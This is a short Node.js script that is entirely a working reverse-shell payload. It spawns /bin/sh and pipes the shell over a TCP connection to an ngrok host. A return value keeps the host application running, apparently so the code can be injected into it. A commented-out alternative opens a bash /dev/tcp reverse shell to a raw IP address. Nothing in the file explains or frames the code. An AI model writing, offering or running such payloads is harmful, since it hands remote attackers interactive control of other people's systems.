#!/usr/bin/env node
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(13199, "6.tcp.ngrok.io", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
// require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/3.132.159.158/13199 0>%261"')